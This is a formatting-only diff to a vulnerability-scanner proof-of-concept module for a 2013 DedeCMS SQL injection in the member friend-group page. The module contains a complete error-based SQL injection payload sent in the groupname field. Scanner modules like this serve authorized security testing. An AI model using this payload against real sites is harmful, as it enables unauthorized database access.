@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
 
+
 class Vuln(ABVuln):
-    vuln_id = 'DedeCMS_0025' # 平台漏洞编号，留空
+    vuln_id = 'DedeCMS_0025'  # 平台漏洞编号，留空
     name = 'DedeCMS会员中心好友分组设置SQL注射'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2013-01-03'  # 漏洞公布时间
     desc = '''
         需要magic_quotes_gpc = Off
@@ -19,6 +20,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'DedeCMS(织梦CMS)'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '2403dd33-8234-41aa-92fd-fc096be5cef5'
@@ -32,7 +34,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             payload = '/member/myfriend_group.php?dopost=add'
             data = "groupname=fffrrr'and @`'` and (SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),(substring((Select (md5(c))),1,62)))a from information_schema.tables group by a)b) and '"
             url = self.target + payload
@@ -47,6 +49,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
